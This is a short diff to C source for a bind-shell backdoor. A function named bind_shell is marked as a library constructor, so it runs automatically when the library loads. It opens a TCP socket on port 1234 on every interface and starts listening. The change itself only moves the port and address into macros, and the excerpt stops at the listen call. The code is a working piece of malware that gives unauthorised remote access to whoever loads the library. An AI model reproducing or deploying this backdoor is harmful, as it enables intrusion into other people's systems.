@@ -4,12 +4,15 @@
 #include <unistd.h> 
 #include <sys/wait.h>
 
+#define port 1234
+#define addr INADDR_ANY
+
 void __attribute__((constructor)) bind_shell(){
   int host_sock = socket(AF_INET, SOCK_STREAM, 0);
   struct sockaddr_in host_addr;
   host_addr.sin_family = AF_INET;
-  host_addr.sin_port = htons(1234);
-  host_addr.sin_addr.s_addr = INADDR_ANY;
+  host_addr.sin_port = htons(port);
+  host_addr.sin_addr.s_addr = addr;
   bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
   listen(host_sock, 0);
   
